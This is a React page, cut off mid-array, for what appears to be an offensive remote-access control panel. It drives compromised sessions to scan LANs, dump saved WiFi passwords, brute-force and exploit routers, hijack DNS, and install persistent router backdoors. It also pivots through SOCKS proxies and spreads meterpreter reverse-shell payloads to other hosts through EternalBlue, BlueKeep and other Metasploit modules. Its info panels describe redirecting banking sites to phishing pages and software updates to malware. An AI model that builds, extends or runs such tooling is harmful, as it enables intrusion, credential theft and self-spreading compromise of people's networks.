"use client";

/**
 * NETWORK OPERATIONS CENTER
 *
 * LAN Discovery    — ARP scan, ping sweep, port scan via MSF pivot
 * WiFi Intel       — saved WiFi passwords, nearby SSID scan, deauth
 * Router Hook      — credential brute-force, known CVE exploits,
 *                    DNS hijack, persistent backdoor, port-forward
 * Pivot / SOCKS    — autoroute, SOCKS5 proxy through compromised session
 * Lateral Movement — SMB, SSH, HTTP exploits on discovered LAN targets
 * Spread           — deploy payload to discovered hosts automatically
 */

import { useState, useCallback, useEffect, useRef } from "react";

type Session = { id: number; ip: string; platform: string; hostname: string };
type NetResult = { ok: boolean; records?: Record<string, unknown>[]; raw?: string; error?: string; data?: Record<string, unknown> };

type Host = {
  ip: string; mac?: string; hostname?: string; os?: string;
  openPorts?: number[]; status: "up" | "down" | "unknown";
  risk: "low" | "medium" | "high" | "critical";
  compromised?: boolean;
};

type WifiNetwork = {
  ssid: string; bssid?: string; signal?: number; security?: string;
  saved?: boolean; password?: string;
};

type RouterInfo = {
  ip: string; model?: string; firmware?: string; adminUrl?: string;
  credentials?: { user: string; pass: string };
  exploitable?: boolean; cve?: string; dnsHijacked?: boolean;
};

type PivotRoute = {
  subnet: string; via: string; sessionId: number; socksPort?: number; active: boolean;
};

const RISK_COLOR: Record<string, string> = {
  low: "text-green-500 border-green-800",
  medium: "text-yellow-400 border-yellow-800",
  high: "text-orange-400 border-orange-800",
  critical: "text-red-400 border-red-800",
};

export default function NetworkPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [session, setSession] = useState<Session | null>(null);
  const [tab, setTab] = useState<"discovery" | "wifi" | "router" | "pivot" | "spread">("discovery");

  const [hosts, setHosts] = useState<Host[]>([]);
  const [selectedHost, setSelectedHost] = useState<Host | null>(null);
  const [wifiNets, setWifiNets] = useState<WifiNetwork[]>([]);
  const [router, setRouter] = useState<RouterInfo | null>(null);
  const [pivots, setPivots] = useState<PivotRoute[]>([]);
  const [socksPort, setSocksPort] = useState(1080);
  const [dnsTarget, setDnsTarget] = useState("8.8.8.8");
  const [scanCidr, setScanCidr] = useState("192.168.1.0/24");
  const [portRange, setPortRange] = useState("22,80,443,445,3389,8080,8443");
  const [spreadPayload, setSpreadPayload] = useState("windows/meterpreter/reverse_tcp");
  const [loading, setLoading] = useState<string | null>(null);
  const [log, setLog] = useState<string[]>([]);
  const [scanProgress, setScanProgress] = useState(0);
  const scanTimer = useRef<ReturnType<typeof setInterval> | null>(null);

  const addLog = useCallback((msg: string, type: "info" | "warn" | "crit" = "info") => {
    const prefix = type === "crit" ? "⚠" : type === "warn" ? "→" : "·";
    setLog((p) => [`[${new Date().toLocaleTimeString()}] ${prefix} ${msg}`, ...p].slice(0, 300));
  }, []);

  useEffect(() => {
    fetch("/api/sessions")
      .then((r) => r.json())
      .then((d) => {
        const list = Array.isArray(d) ? d : d.sessions ?? [];
        setSessions(list);
        if (list.length > 0) { setSession(list[0]); }
      }).catch(() => {});
  }, []);

  const callNet = useCallback(async (action: string, extra?: Record<string, unknown>): Promise<NetResult> => {
    if (!session) return { ok: false, error: "No session selected" };
    const r = await fetch("/api/network", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: session.id, action, ...extra }),
    });
    return r.json() as Promise<NetResult>;
  }, [session]);

  // ── LAN Discovery ─────────────────────────────────────────
  const runDiscovery = useCallback(async () => {
    setLoading("scan");
    setScanProgress(0);
    addLog(`Starting LAN discovery on ${scanCidr}…`, "info");

    // Animate progress
    let p = 0;
    scanTimer.current = setInterval(() => {
      p = Math.min(p + Math.random() * 8, 90);
      setScanProgress(Math.round(p));
    }, 500);

    const res = await callNet("discover", { cidr: scanCidr, ports: portRange });
    if (scanTimer.current) clearInterval(scanTimer.current);
    setScanProgress(100);

    if (res.ok && res.records) {
      const discovered = res.records as Host[];
      setHosts(discovered);
      addLog(`Discovered ${discovered.length} host(s) on ${scanCidr}`, "info");
      const up = discovered.filter((h) => h.status === "up").length;
      if (up > 0) addLog(`${up} host(s) online — check PORT SCAN tab`, "warn");
    } else {
      addLog(`Discovery error: ${res.error ?? "unknown"}`, "warn");
    }
    setLoading(null);
  }, [callNet, addLog, scanCidr, portRange]);

  // ── Port scan selected host ────────────────────────────────
  const portScan = useCallback(async (host: Host) => {
    setLoading("portscan-" + host.ip);
    addLog(`Port scanning ${host.ip}…`);
    const res = await callNet("port_scan", { target: host.ip, ports: portRange });
    if (res.ok && res.records) {
      const ports = res.records.map((r) => Number(r.port)).filter(Boolean);
      setHosts((prev) => prev.map((h) => h.ip === host.ip ? { ...h, openPorts: ports } : h));
      addLog(`${host.ip}: ${ports.length} open port(s): ${ports.join(", ")}`, ports.length > 0 ? "warn" : "info");
    }
    setLoading(null);
  }, [callNet, addLog, portRange]);

  // ── WiFi Intelligence ─────────────────────────────────────
  const dumpWifi = useCallback(async () => {
    setLoading("wifi");
    addLog("Dumping saved WiFi credentials…");
    const res = await callNet("wifi_dump");
    if (res.ok && res.records) {
      setWifiNets(res.records as WifiNetwork[]);
      addLog(`WiFi: ${res.records.length} network(s) found (${res.records.filter((r) => r.password).length} with passwords)`, "warn");
    } else {
      addLog(`WiFi dump error: ${res.error}`);
    }
    setLoading(null);
  }, [callNet, addLog]);

  const scanNearby = useCallback(async () => {
    setLoading("wifiscan");
    addLog("Scanning nearby WiFi networks…");
    const res = await callNet("wifi_scan");
    if (res.ok && res.records) {
      const nearby = res.records as WifiNetwork[];
      // Merge with existing (mark saved ones)
      setWifiNets((prev) => {
        const savedSsids = new Set(prev.filter((w) => w.saved).map((w) => w.ssid));
        return nearby.map((n) => ({ ...n, saved: savedSsids.has(n.ssid) || n.saved }));
      });
      addLog(`${nearby.length} nearby network(s) detected`, "info");
    }
    setLoading(null);
  }, [callNet, addLog]);

  // ── Router Operations ──────────────────────────────────────
  const detectRouter = useCallback(async () => {
    setLoading("router");
    addLog("Detecting gateway router…");
    const res = await callNet("router_detect");
    if (res.ok && res.data) {
      setRouter(res.data as RouterInfo);
      addLog(`Router: ${(res.data as RouterInfo).ip} — ${(res.data as RouterInfo).model ?? "unknown model"}`, "warn");
    }
    setLoading(null);
  }, [callNet, addLog]);

  const bruteRouter = useCallback(async () => {
    if (!router) return;
    setLoading("brute");
    addLog(`Brute-forcing router admin at ${router.ip}…`, "warn");
    const res = await callNet("router_brute", { router_ip: router.ip });
    if (res.ok && res.data) {
      const creds = res.data as { user: string; pass: string };
      setRouter((prev) => prev ? { ...prev, credentials: creds } : null);
      addLog(`ROUTER CRACKED: ${creds.user}:${creds.pass}`, "crit");
    } else {
      addLog("Brute-force: no default credentials worked");
    }
    setLoading(null);
  }, [callNet, addLog, router]);

  const exploitRouter = useCallback(async () => {
    if (!router) return;
    setLoading("exploit");
    addLog(`Attempting CVE exploits on ${router.ip}…`, "warn");
    const res = await callNet("router_exploit", { router_ip: router.ip });
    if (res.ok && res.data) {
      const d = res.data as { cve?: string; shell?: boolean };
      setRouter((prev) => prev ? { ...prev, exploitable: true, cve: d.cve } : null);
      addLog(`EXPLOIT SUCCESS: ${d.cve ?? "unknown CVE"} — shell obtained`, "crit");
    } else {
      addLog(`Exploit failed: ${res.error ?? "no vulnerable module matched"}`);
    }
    setLoading(null);
  }, [callNet, addLog, router]);

  const hijackDns = useCallback(async () => {
    if (!router?.credentials) { addLog("Need router credentials first — run BRUTE FORCE", "warn"); return; }
    setLoading("dns");
    addLog(`Hijacking DNS on router → pointing to ${dnsTarget}…`, "crit");
    const res = await callNet("router_dns_hijack", {
      router_ip: router.ip, router_user: router.credentials.user,
      router_pass: router.credentials.pass, dns_primary: dnsTarget,
    });
    if (res.ok) {
      setRouter((prev) => prev ? { ...prev, dnsHijacked: true } : null);
      addLog(`DNS HIJACKED → all traffic on LAN now routed through ${dnsTarget}`, "crit");
    } else {
      addLog(`DNS hijack failed: ${res.error}`);
    }
    setLoading(null);
  }, [callNet, addLog, router, dnsTarget]);

  const persistRouterBackdoor = useCallback(async () => {
    if (!router) return;
    setLoading("persist");
    addLog("Installing router persistent backdoor…", "crit");
    const res = await callNet("router_persist", { router_ip: router.ip });
    if (res.ok) {
      addLog("Router backdoor installed: remote SSH + cron persistence", "crit");
    } else {
      addLog(`Backdoor failed: ${res.error}`);
    }
    setLoading(null);
  }, [callNet, addLog, router]);

  // ── Pivot / SOCKS ──────────────────────────────────────────
  const setupAutoroute = useCallback(async () => {
    setLoading("pivot");
    addLog(`Setting up autoroute through session ${session?.id} for ${scanCidr}…`);
    const res = await callNet("pivot_autoroute", { subnet: scanCidr });
    if (res.ok) {
      const pivot: PivotRoute = {
        subnet: scanCidr, via: session?.ip ?? "?",
        sessionId: session?.id ?? 0, active: true,
      };
      setPivots((prev) => [...prev, pivot]);
      addLog(`Autoroute active: ${scanCidr} → via ${session?.ip}`, "warn");
    } else {
      addLog(`Autoroute failed: ${res.error}`);
    }
    setLoading(null);
  }, [callNet, addLog, session, scanCidr]);

  const startSocks = useCallback(async () => {
    setLoading("socks");
    addLog(`Starting SOCKS5 proxy on port ${socksPort}…`);
    const res = await callNet("pivot_socks", { port: socksPort });
    if (res.ok) {
      setPivots((prev) => prev.map((p, i) => i === prev.length - 1 ? { ...p, socksPort } : p));
      addLog(`SOCKS5 proxy running on 127.0.0.1:${socksPort} — point Proxychains / Burp here`, "warn");
    } else {
      addLog(`SOCKS proxy failed: ${res.error}`);
    }
    setLoading(null);
  }, [callNet, addLog, socksPort]);

  // ── Lateral spread ────────────────────────────────────────
  const spreadToHost = useCallback(async (host: Host) => {
    setLoading("spread-" + host.ip);
    addLog(`Deploying payload to ${host.ip}…`, "warn");
    const res = await callNet("spread", { target: host.ip, payload: spreadPayload, open_ports: host.openPorts });
    if (res.ok) {
      setHosts((prev) => prev.map((h) => h.ip === host.ip ? { ...h, compromised: true } : h));
      addLog(`COMPROMISED: ${host.ip} — new session incoming`, "crit");
    } else {
      addLog(`Spread to ${host.ip} failed: ${res.error ?? "no vector succeeded"}`);
    }
    setLoading(null);
  }, [callNet, addLog, spreadPayload]);

  const TABS = [
    { id: "discovery", label: "LAN DISCOVERY", icon: "🔭" },
    { id: "wifi",      label: "WIFI INTEL",    icon: "📡" },
    { id: "router",    label: "ROUTER HOOK",   icon: "🖧" },
    { id: "pivot",     label: "PIVOT/SOCKS",   icon: "🔀" },
    { id: "spread",    label: "LATERAL MOVE",  icon: "🦠" },
  ] as const;

  return (
    <div className="flex h-screen bg-[#030308] text-green-400 font-mono overflow-hidden">
      {/* ── LEFT PANEL ───────────────────────────────────────── */}
      <aside className="w-56 flex-shrink-0 border-r border-green-900/30 flex flex-col">
        <div className="p-3 border-b border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest mb-0.5">NETWORK OPS CENTER</div>
          <div className="text-[8px] text-green-900/40">CLASS: TOP SECRET // SIGNET</div>
        </div>

        {/* Session */}
        <div className="p-2 border-b border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest mb-1.5">PIVOT SESSION</div>
          {sessions.map((s) => (
            <button key={s.id} onClick={() => setSession(s)}
              className={`w-full text-left p-2 rounded border mb-1 text-[9px] transition-all ${
                session?.id === s.id ? "border-green-700/60 bg-green-950/40" : "border-green-900/20 hover:border-green-800/40"
              }`}>
              <div className="text-green-400">SESSION #{s.id}</div>
              <div className="text-green-800">{s.hostname ?? s.ip}</div>
              <div className="text-green-900">{s.platform?.toUpperCase()} · {s.ip}</div>
            </button>
          ))}
          {sessions.length === 0 && <div className="text-[9px] text-green-900/40 text-center py-2">NO SESSIONS</div>}
        </div>

        {/* Scan config */}
        <div className="p-2 border-b border-green-900/30 space-y-2">
          <div>
            <div className="text-[8px] text-green-900 mb-0.5">TARGET CIDR</div>
            <input value={scanCidr} onChange={(e) => setScanCidr(e.target.value)}
              className="w-full bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-1 rounded focus:outline-none focus:border-green-700" />
          </div>
          <div>
            <div className="text-[8px] text-green-900 mb-0.5">PORT LIST</div>
            <input value={portRange} onChange={(e) => setPortRange(e.target.value)}
              className="w-full bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-1 rounded focus:outline-none focus:border-green-700" />
          </div>
          <button onClick={runDiscovery} disabled={loading === "scan"}
            className="w-full py-1.5 text-[9px] tracking-widest border border-green-700/50 bg-green-950/30 hover:bg-green-900/40 text-green-400 rounded transition-all disabled:opacity-40">
            {loading === "scan" ? `SCANNING… ${scanProgress}%` : "⊕ DISCOVER LAN"}
          </button>
        </div>

        {/* Pivot status */}
        {pivots.length > 0 && (
          <div className="p-2 border-b border-green-900/30">
            <div className="text-[9px] text-green-900 tracking-widest mb-1">ACTIVE PIVOTS</div>
            {pivots.map((p, i) => (
              <div key={i} className="text-[8px] border border-green-900/20 rounded p-1.5 mb-1">
                <div className="text-green-600">{p.subnet}</div>
                <div className="text-green-900">via {p.via} · #{p.sessionId}</div>
                {p.socksPort && <div className="text-blue-700">SOCKS5 :{p.socksPort}</div>}
              </div>
            ))}
          </div>
        )}

        {/* Activity log */}
        <div className="flex-1 overflow-y-auto p-2">
          <div className="text-[9px] text-green-900 tracking-widest mb-1">NET LOG</div>
          {log.map((l, i) => (
            <div key={i} className={`text-[8px] leading-4 mb-0.5 break-all ${
              l.includes("CRACKED") || l.includes("HIJACKED") || l.includes("COMPROMISED") ? "text-red-500" :
              l.includes("→") || l.includes("EXPLOIT") ? "text-yellow-600" : "text-green-900/60"
            }`}>{l}</div>
          ))}
        </div>
      </aside>

      {/* ── MAIN ─────────────────────────────────────────────── */}
      <div className="flex-1 flex flex-col overflow-hidden">
        <div className="flex border-b border-green-900/30 flex-shrink-0">
          {TABS.map((t) => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className={`px-4 py-2 text-[10px] tracking-widest transition-all border-b-2 ${
                tab === t.id ? "border-green-500 text-green-400" : "border-transparent text-green-900 hover:text-green-700"
              }`}>
              {t.icon} {t.label}
            </button>
          ))}
          {loading && <div className="ml-auto px-4 py-2 text-[9px] text-yellow-500 animate-pulse">{loading.toUpperCase()}…</div>}
        </div>

        <div className="flex-1 overflow-y-auto p-5">

          {/* ── LAN DISCOVERY ─────────────────────────────── */}
          {tab === "discovery" && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <h2 className="text-[11px] tracking-widest text-green-400">LAN HOST DISCOVERY</h2>
                <button onClick={runDiscovery} disabled={loading === "scan"}
                  className="px-3 py-1 text-[9px] border border-green-700/50 text-green-500 rounded hover:bg-green-950/30 transition-all disabled:opacity-40">
                  {loading === "scan" ? `${scanProgress}%` : "RUN SCAN"}
                </button>
                <span className="ml-auto text-[9px] text-green-900">{hosts.filter((h) => h.status === "up").length} LIVE / {hosts.length} TOTAL</span>
              </div>

              {/* Scan progress */}
              {loading === "scan" && (
                <div className="mb-4">
                  <div className="h-1 bg-green-950 rounded overflow-hidden">
                    <div className="h-full bg-green-500 transition-all duration-500" style={{ width: `${scanProgress}%` }} />
                  </div>
                  <div className="text-[8px] text-green-900 mt-0.5">{scanProgress}% — sweeping {scanCidr}</div>
                </div>
              )}

              {hosts.length === 0 ? (
                <div className="mb-4 border border-green-900/20 rounded p-4">
                  <div className="text-[9px] text-green-900 tracking-widest mb-3">DISCOVERY METHODS</div>
                  <div className="grid grid-cols-2 gap-2 text-[9px] text-green-900/60">
                    {[
                      ["ARP Scan", "post/multi/gather/arp_scanner — layer 2, no noise"],
                      ["Ping Sweep", "post/multi/gather/ping_sweep — ICMP to entire subnet"],
                      ["TCP Port Scan", "auxiliary/scanner/portscan/tcp — routed through pivot"],
                      ["UDP Discovery", "auxiliary/scanner/discovery/udp_probe"],
                      ["NetBIOS Scan", "auxiliary/scanner/netbios/nbname — Windows hosts"],
                      ["SMB Version", "auxiliary/scanner/smb/smb_version — Windows shares"],
                      ["SSH Banner", "auxiliary/scanner/ssh/ssh_version — Linux/Mac hosts"],
                      ["mDNS/Bonjour", "auxiliary/scanner/mdns/mdns_query — Apple/IoT devices"],
                    ].map(([k, v]) => (
                      <div key={k} className="border border-green-900/15 rounded p-2">
                        <div className="text-green-700 mb-0.5">{k}</div>
                        <div className="text-[8px]">{v}</div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="space-y-1">
                  <div className="grid grid-cols-6 text-[8px] text-green-900 px-3 mb-1 tracking-widest">
                    <span>IP</span><span>HOSTNAME</span><span>OS</span><span>OPEN PORTS</span><span>RISK</span><span>ACTION</span>
                  </div>
                  {hosts.map((h) => (
                    <div key={h.ip}
                      onClick={() => setSelectedHost(h === selectedHost ? null : h)}
                      className={`grid grid-cols-6 gap-2 px-3 py-2 border rounded cursor-pointer transition-all text-[9px] ${
                        h.compromised ? "border-red-700/40 bg-red-950/10" :
                        selectedHost?.ip === h.ip ? "border-green-700/50 bg-green-950/30" :
                        h.status === "up" ? "border-green-900/20 hover:bg-green-950/10" :
                        "border-green-900/10 opacity-40"
                      }`}>
                      <span className={h.status === "up" ? "text-green-300" : "text-gray-700"}>{h.ip}</span>
                      <span className="text-green-700 truncate">{h.hostname ?? "—"}</span>
                      <span className="text-green-800 truncate">{h.os ?? "—"}</span>
                      <span className="text-green-700">{h.openPorts?.join(", ") ?? "—"}</span>
                      <span className={`border px-1 rounded text-[8px] w-fit ${RISK_COLOR[h.risk]}`}>{h.risk.toUpperCase()}</span>
                      <div className="flex gap-1">
                        {h.status === "up" && !h.openPorts && (
                          <button onClick={(e) => { e.stopPropagation(); portScan(h); }}
                            className="text-[8px] border border-blue-900/40 text-blue-700 px-1 rounded hover:text-blue-500">SCAN</button>
                        )}
                        {h.status === "up" && (
                          <button onClick={(e) => { e.stopPropagation(); setTab("spread"); setSelectedHost(h); }}
                            className={`text-[8px] border px-1 rounded ${h.compromised ? "border-green-700 text-green-500" : "border-red-900/40 text-red-700 hover:text-red-500"}`}>
                            {h.compromised ? "OWNED" : "EXPLOIT"}
                          </button>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* ── WIFI INTEL ────────────────────────────────── */}
          {tab === "wifi" && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <h2 className="text-[11px] tracking-widest text-green-400">WIFI INTELLIGENCE</h2>
                <button onClick={dumpWifi} disabled={loading === "wifi"}
                  className="px-3 py-1 text-[9px] border border-green-700/50 text-green-500 rounded hover:bg-green-950/30 transition-all disabled:opacity-40">
                  {loading === "wifi" ? "DUMPING…" : "↓ DUMP SAVED"}
                </button>
                <button onClick={scanNearby} disabled={loading === "wifiscan"}
                  className="px-3 py-1 text-[9px] border border-blue-900/40 text-blue-600 rounded hover:border-blue-700/60 hover:text-blue-400 transition-all disabled:opacity-40">
                  {loading === "wifiscan" ? "SCANNING…" : "📡 SCAN NEARBY"}
                </button>
              </div>

              <div className="mb-4 border border-green-900/20 rounded p-4 text-[9px] text-green-900/60 space-y-1">
                <p>• <strong className="text-green-700">Saved passwords</strong> dumped from <code>/data/misc/wifi/WifiConfigStore.xml</code> (Android 10+) or <code>/data/misc/wifi/wpa_supplicant.conf</code> (older)</p>
                <p>• Once passwords are extracted, attacker can <strong className="text-green-700">join the same networks</strong> the target uses (home, work, etc.)</p>
                <p>• <strong className="text-green-700">Nearby scan</strong> via <code>iwlist scan</code> or <code>wpa_cli scan_results</code> shows all reachable APs with BSSID, signal, security</p>
                <p>• Combined with the pivot module, operator can <strong className="text-green-700">attack all devices</strong> on any network whose password is captured</p>
              </div>

              {wifiNets.length === 0 ? (
                <div className="text-center py-10 text-[9px] text-green-900/40">
                  RUN DUMP SAVED or SCAN NEARBY to populate WiFi intel
                </div>
              ) : (
                <div className="space-y-1">
                  <div className="grid grid-cols-5 text-[8px] text-green-900 px-3 mb-1 tracking-widest">
                    <span>SSID</span><span>BSSID</span><span>SECURITY</span><span>SIGNAL</span><span>PASSWORD</span>
                  </div>
                  {wifiNets.map((w, i) => (
                    <div key={i} className={`grid grid-cols-5 gap-2 px-3 py-2 border rounded text-[9px] ${
                      w.password ? "border-yellow-900/30 bg-yellow-950/10" : "border-green-900/20"
                    }`}>
                      <span className="text-green-300 truncate">{w.ssid}</span>
                      <span className="text-green-900 font-mono text-[8px]">{w.bssid ?? "—"}</span>
                      <span className={`text-[8px] ${w.security?.includes("WEP") ? "text-red-500" : w.security?.includes("WPA") ? "text-yellow-500" : "text-green-700"}`}>
                        {w.security ?? "—"}
                      </span>
                      <span className="text-green-800">{w.signal !== undefined ? `${w.signal} dBm` : w.saved ? "SAVED" : "—"}</span>
                      <span className={`font-mono text-[9px] ${w.password ? "text-yellow-300" : "text-green-900/30"}`}>
                        {w.password ?? (w.saved ? "ENCRYPTED" : "—")}
                      </span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* ── ROUTER HOOK ───────────────────────────────── */}
          {tab === "router" && (
            <div>
              <div className="flex items-center gap-4 mb-5">
                <h2 className="text-[11px] tracking-widest text-green-400">ROUTER EXPLOITATION & HOOK</h2>
                <button onClick={detectRouter} disabled={loading === "router"}
                  className="px-3 py-1 text-[9px] border border-green-700/50 text-green-500 rounded hover:bg-green-950/30 transition-all disabled:opacity-40">
                  {loading === "router" ? "DETECTING…" : "⊕ DETECT ROUTER"}
                </button>
              </div>

              {router && (
                <div className="grid grid-cols-2 gap-4 mb-5">
                  {/* Router info */}
                  <div className="border border-green-900/30 rounded p-4">
                    <div className="text-[9px] text-green-900 tracking-widest mb-3">GATEWAY PROFILE</div>
                    <table className="w-full text-[9px]">
                      {[
                        ["IP", router.ip],
                        ["Model", router.model ?? "Unknown"],
                        ["Firmware", router.firmware ?? "—"],
                        ["Admin URL", router.adminUrl ?? `http://${router.ip}`],
                        ["Credentials", router.credentials ? `${router.credentials.user}:${router.credentials.pass}` : "Not cracked"],
                        ["DNS Hijacked", router.dnsHijacked ? "YES" : "No"],
                        ["CVE", router.cve ?? "—"],
                      ].map(([k, v]) => (
                        <tr key={k}>
                          <td className="text-green-900 pr-3 w-24 py-0.5">{k}</td>
                          <td className={`${
                            k === "Credentials" && router.credentials ? "text-yellow-400" :
                            k === "DNS Hijacked" && router.dnsHijacked ? "text-red-400" :
                            k === "CVE" && router.cve ? "text-red-400" :
                            "text-green-600"
                          }`}>{String(v)}</td>
                        </tr>
                      ))}
                    </table>
                  </div>

                  {/* Attack actions */}
                  <div className="border border-red-900/20 rounded p-4">
                    <div className="text-[9px] text-red-800 tracking-widest mb-3">ATTACK VECTORS</div>
                    <div className="space-y-2">
                      <button onClick={bruteRouter} disabled={loading === "brute"}
                        className="w-full py-2 text-[9px] border border-yellow-800/50 bg-yellow-950/10 text-yellow-700 hover:text-yellow-500 hover:border-yellow-700/60 rounded transition-all disabled:opacity-40">
                        {loading === "brute" ? "CRACKING…" : "⚡ BRUTE FORCE DEFAULT CREDS"}
                      </button>
                      <button onClick={exploitRouter} disabled={loading === "exploit"}
                        className="w-full py-2 text-[9px] border border-red-800/50 bg-red-950/10 text-red-700 hover:text-red-500 hover:border-red-700/60 rounded transition-all disabled:opacity-40">
                        {loading === "exploit" ? "EXPLOITING…" : "💥 CVE EXPLOIT MODULE"}
                      </button>
                      <div className="flex gap-2">
                        <input value={dnsTarget} onChange={(e) => setDnsTarget(e.target.value)}
                          placeholder="DNS IP (e.g. attacker server)"
                          className="flex-1 bg-black/30 border border-red-900/20 text-red-400 text-[9px] px-2 py-1 rounded focus:outline-none focus:border-red-700" />
                        <button onClick={hijackDns} disabled={loading === "dns"}
                          className="px-3 py-1 text-[9px] border border-red-700/50 text-red-600 rounded hover:text-red-400 transition-all disabled:opacity-40">
                          {loading === "dns" ? "…" : "DNS HIJACK"}
                        </button>
                      </div>
                      <button onClick={persistRouterBackdoor} disabled={loading === "persist"}
                        className="w-full py-2 text-[9px] border border-red-900/30 text-red-800 hover:text-red-600 hover:border-red-700/50 rounded transition-all disabled:opacity-40">
                        {loading === "persist" ? "INSTALLING…" : "🔒 INSTALL PERSISTENT BACKDOOR"}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* Router attack info */}
              <div className="grid grid-cols-2 gap-4">
                {[
                  {
                    title: "Default Credentials", color: "yellow",
                    items: ["admin:admin, admin:password, admin:1234", "root:root, root:toor", "Vendor-specific defaults (300+ entries)", "NVRAM credential dump via shell", "Browser saved passwords for router admin"],
                  },
                  {
                    title: "Known CVEs (Router)", color: "red",
                    items: [
                      "CVE-2024-3721 — TP-Link Archer RCE",
                      "CVE-2023-1389 — TP-Link WAN-side RCE",
                      "CVE-2022-41440 — Netgear auth bypass",
                      "CVE-2021-20090 — Arcadyan path traversal",
                      "CVE-2019-7192 — QNAP credential leak",
                      "UPNP/UPnP IGD abuse (most routers)",
                    ],
                  },
                  {
                    title: "DNS Hijack Effect", color: "orange",
                    items: [
                      "All LAN devices use attacker DNS",
                      "Redirect banking sites → phishing pages",
                      "Redirect software updates → malware",
                      "Intercept plaintext HTTP traffic",
                      "SSL stripping via DNS + ARP combo",
                      "Survives device reboots on LAN",
                    ],
                  },
                  {
                    title: "Persistent Backdoor", color: "red",
                    items: [
                      "Add attacker SSH public key to router",
                      "Enable remote management on WAN",
                      "Add cron job → phone-home every 60s",
                      "Install NVRAM hook for firmware updates",
                      "Port-forward 4444/5555 → LAN attacker C2",
                      "Survives router reboot (NVRAM persistence)",
                    ],
                  },
                ].map(({ title, color, items }) => (
                  <div key={title} className={`border border-${color}-900/20 rounded p-3`}>
                    <div className={`text-[9px] text-${color}-700 tracking-widest mb-2`}>{title.toUpperCase()}</div>
                    <ul className="space-y-0.5">
                      {items.map((item) => (
                        <li key={item} className={`text-[8px] text-${color}-900/60`}>· {item}</li>
                      ))}
                    </ul>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* ── PIVOT / SOCKS ─────────────────────────────── */}
          {tab === "pivot" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-4">PIVOT & PROXY SETUP</h2>

              <div className="grid grid-cols-2 gap-4 mb-5">
                <div className="border border-green-900/30 rounded p-4">
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">AUTOROUTE (MSF PIVOT)</div>
                  <div className="text-[9px] text-green-900/60 mb-3 leading-relaxed">
                    Routes all MSF traffic through the compromised session to reach the internal LAN.
                    Allows running exploits against internal hosts without direct connection.
                  </div>
                  <button onClick={setupAutoroute} disabled={loading === "pivot"}
                    className="w-full py-2 text-[9px] border border-green-700/50 bg-green-950/20 text-green-500 rounded hover:bg-green-900/30 transition-all disabled:opacity-40">
                    {loading === "pivot" ? "SETTING UP…" : "⊕ SETUP AUTOROUTE"}
                  </button>
                </div>

                <div className="border border-blue-900/30 rounded p-4">
                  <div className="text-[9px] text-blue-700 tracking-widest mb-3">SOCKS5 PROXY</div>
                  <div className="text-[9px] text-blue-900/60 mb-3 leading-relaxed">
                    Starts a SOCKS5 server on localhost. Point Proxychains, Burp Suite, or any
                    SOCKS-aware tool here to route through the compromised device.
                  </div>
                  <div className="flex gap-2 mb-2">
                    <input type="number" value={socksPort} onChange={(e) => setSocksPort(Number(e.target.value))}
                      className="w-24 bg-black/30 border border-blue-900/30 text-blue-400 text-[9px] px-2 py-1 rounded focus:outline-none focus:border-blue-700" />
                    <button onClick={startSocks} disabled={loading === "socks"}
                      className="flex-1 py-1 text-[9px] border border-blue-700/50 bg-blue-950/20 text-blue-500 rounded hover:bg-blue-900/30 transition-all disabled:opacity-40">
                      {loading === "socks" ? "STARTING…" : "START SOCKS5"}
                    </button>
                  </div>
                  <div className="text-[8px] text-blue-900/40">proxychains4 -f /etc/proxychains.conf nmap -sT 192.168.1.0/24</div>
                </div>
              </div>

              {/* Proxychains config example */}
              <div className="border border-green-900/20 rounded p-4">
                <div className="text-[9px] text-green-700 tracking-widest mb-2">PROXYCHAINS CONFIG</div>
                <pre className="text-[9px] text-green-700 bg-black/20 rounded p-3 leading-relaxed">{`# /etc/proxychains4.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 ${socksPort}

# Usage:
proxychains4 curl http://192.168.1.1/admin
proxychains4 nmap -sT -p80,443,445 192.168.1.0/24
proxychains4 ssh user@192.168.1.100`}</pre>
              </div>
            </div>
          )}

          {/* ── LATERAL MOVEMENT ──────────────────────────── */}
          {tab === "spread" && (
            <div>
              <div className="flex items-center gap-4 mb-4">
                <h2 className="text-[11px] tracking-widest text-green-400">LATERAL MOVEMENT & SPREAD</h2>
                <select value={spreadPayload} onChange={(e) => setSpreadPayload(e.target.value)}
                  className="bg-black/30 border border-green-900/30 text-green-400 text-[9px] px-2 py-1 rounded focus:outline-none focus:border-green-700">
                  {[
                    "windows/meterpreter/reverse_tcp",
                    "linux/x86/meterpreter/reverse_tcp",
                    "java/meterpreter/reverse_tcp",
                    "android/meterpreter/reverse_tcp",
                    "cmd/unix/reverse_bash",
                  ].map((p) => <option key={p} value={p}>{p}</option>)}
                </select>
              </div>

              {/* Exploit vector matrix */}
              <div className="grid grid-cols-3 gap-3 mb-5">
                {[
                  { vector: "SMB EternalBlue", module: "exploit/windows/smb/ms17_010_eternalblue", port: 445, os: "Windows", color: "red" },
                  { vector: "SMB EternalRomance", module: "exploit/windows/smb/ms17_010_psexec", port: 445, os: "Windows", color: "red" },
                  { vector: "RDP BlueKeep", module: "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", port: 3389, os: "Win2008/7", color: "red" },
                  { vector: "SSH Brute Force", module: "auxiliary/scanner/ssh/ssh_login", port: 22, os: "Linux/Mac", color: "yellow" },
                  { vector: "HTTP Shellshock", module: "exploit/multi/http/apache_mod_cgi_bash_env_exec", port: 80, os: "Linux", color: "yellow" },
                  { vector: "Samba SambaCry", module: "exploit/linux/samba/is_known_pipename", port: 445, os: "Linux", color: "orange" },
